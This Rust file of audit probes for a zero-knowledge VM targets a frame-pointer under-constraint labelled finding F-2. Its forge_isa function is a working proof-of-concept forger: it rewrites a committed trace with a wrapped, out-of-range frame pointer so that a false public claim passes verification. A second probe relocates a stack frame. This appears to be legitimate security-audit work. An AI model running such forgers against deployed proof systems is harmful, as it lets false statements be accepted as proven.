//! Malicious witness generators + probes for the frame-pointer under-constraint (F-2).
//!
//! The honest runner can never emit an out-of-range or relocated frame pointer (fp is a
//! `usize` bounded by `memory.len()`), so every experiment here works at the committed-trace
//! level: it mutates the [`ExecutionResult`] that `prove_from_execution_result` turns into
//! the committed columns via the real `get_execution_trace`.
//!
//! The probes answer the audit's open question — *is the deployed AIR's missing fp-range
//! pull an exploitable gap, or is fp pinned indirectly?* — by asking the canonical verifier.

use backend::*;
use lean_vm::*;

/// Print the honest execution's per-cycle `(pc, fp, instruction)` and the non-empty memory
/// cells, so the forge offsets can be read off a real run.
pub fn dump_layout(bytecode: &Bytecode, result: &ExecutionResult) {
    println!("=== per-cycle trace (cycle: pc fp | instruction) ===");
    for i in 0..result.pcs.len() {
        let pc = result.pcs[i];
        let fp = result.fps[i];
        let instr = &bytecode.code()[pc].instruction;
        println!("{i:4}: pc={pc:<4} fp={fp:<6} | {instr}");
    }
    println!("=== non-empty memory cells (addr = value) ===");
    for (addr, cell) in result.memory.0.iter().enumerate() {
        if let Some(v) = cell {
            println!("  m[{addr}] = {}", v.as_canonical_u32());
        }
    }
    println!("=== ending_pc = {} ===", bytecode.ending_pc());
}

/// Ensure `memory.0` can hold index `addr`, filling new slots with `None`.
fn ensure_len(result: &mut ExecutionResult, addr: usize) {
    if result.memory.0.len() <= addr {
        result.memory.0.resize(addr + 1, None);
    }
}

/// KoalaBear prime `p = 2^31 - 2^24 + 1`.
const P: usize = 2130706433;

/// Malicious witness generator for the hand-written ISA program (`crate::isa_guest`).
///
/// Takes an honest [`ExecutionResult`] (produced for the *true* claim) and rewrites the
/// committed trace so the hijack jump installs the **out-of-range** frame pointer
/// `fp = p - RES` for the post-jump cycles. Because the AIR never range-checks `fp` (only the
/// addresses `fp + operand` it forms, which wrap back in-range mod `p`), the result read
/// `m[fp + RES]` lands on `m[0]` — the public claim itself — so the assert `m[fp+RES] ==
/// claim` becomes `claim == claim` and passes for the false claim `false_claim`.
///
/// The honest runner can never produce this: `fp` there is a `usize` bounded by the memory
/// size, and `p - RES ≈ 2^31` would fault as an index. This is exactly finding F-2: the
/// deployed AIR omits the frame-pointer range pull that the Lean model added.
pub fn forge_isa(mut honest: ExecutionResult, false_claim: u32) -> ExecutionResult {
    use crate::isa_guest::{CLAIM, F0, H, JUMP_PC, PTR, RES};
    use lean_vm::PUBLIC_INPUT_LEN;

    let fp_mal = P - RES; // out-of-range frame pointer (field value p - RES ≡ -RES)
    ensure_len(&mut honest, F0 + H);

    // 1. The hijack jump (cycle JUMP_PC) reads updated_fp from m[F0+H]; make it the
    //    out-of-range fp. Nothing in the AIR constrains this cell (it is a hint slot).
    honest.memory.0[F0 + H] = Some(F::from_usize(fp_mal));

    // 2. Run the post-jump cycles (set-pointer, deref, assert, final-jump) at fp = p-RES.
    //    The final-jump's next_fp is a constant 0, so the halt row (JUMP_PC+5) stays fp=0.
    for c in (JUMP_PC + 1)..=(JUMP_PC + 4) {
        honest.fps[c] = fp_mal;
    }

    // 3. Commit the FALSE public statement: public_input[0] = false_claim.
    let pub_in = crate::public_input(false_claim);
    for (i, v) in pub_in.iter().enumerate().take(PUBLIC_INPUT_LEN) {
        honest.memory.0[i] = Some(*v);
    }

    // 4. Populate the wrapped low-memory cells the post-jump section now touches:
    //    addr(off) = (fp_mal + off) mod p.  RES→0 (aliases the public claim), PTR→pointer,
    //    CLAIM→deref result.
    let addr = |off: usize| (fp_mal + off) % P;
    honest.memory.0[addr(PTR)] = Some(F::ZERO); // pointer cell = 0  ⇒ deref reads m[0]
    honest.memory.0[addr(CLAIM)] = Some(F::from_u32(false_claim)); // deref result = m[0] = false_claim
    // addr(RES) = 0, already set to false_claim by step 3.

    honest
}

/// Relocate `fib`'s stack frame from its honest base to `new_base` by rewriting the trace
/// directly. Concretely:
///   * the caller's cell holding the callee frame base (`m[caller_base_cell]`) is set to
///     `new_base`;
///   * every `fps` entry for `fib`'s cycles (`[fib_first_cycle, fib_last_cycle]`) is set to
///     `new_base`;
///   * `fib`'s 15 frame cells are copied from the honest base to `new_base`.
///
/// If the callee frame base were unconstrained (the F-2 claim), the canonical verifier would
/// accept the relocated trace. If it is pinned (e.g. by the `write_call_frame` dereferences),
/// the verifier rejects. Either answer is a result.
#[derive(Debug)]
pub struct FibFrame {
    pub caller_base_cell: usize, // main cell holding fib's frame base (m[314] in the dump)
    pub honest_base: usize,      // 317
    pub fib_first_cycle: usize,  // first cycle index running at fib's fp
    pub fib_last_cycle: usize,   // last such cycle (inclusive) — the return row
    pub frame_span: usize,       // number of fib frame cells to copy (>= max offset touched + 1)
}

pub fn relocate_fib_frame(mut honest: ExecutionResult, frame: &FibFrame, new_base: usize) -> ExecutionResult {
    ensure_len(&mut honest, new_base + frame.frame_span);

    // 1. Point the caller's stored callee-base at the new location.
    honest.memory.0[frame.caller_base_cell] = Some(F::from_usize(new_base));

    // 2. Run fib's cycles at the new frame pointer.
    for i in frame.fib_first_cycle..=frame.fib_last_cycle {
        honest.fps[i] = new_base;
    }

    // 3. Copy fib's frame cells to the new base.
    for off in 0..frame.frame_span {
        let src = honest.memory.0.get(frame.honest_base + off).copied().flatten();
        if let Some(v) = src {
            honest.memory.0[new_base + off] = Some(v);
        }
    }

    honest
}
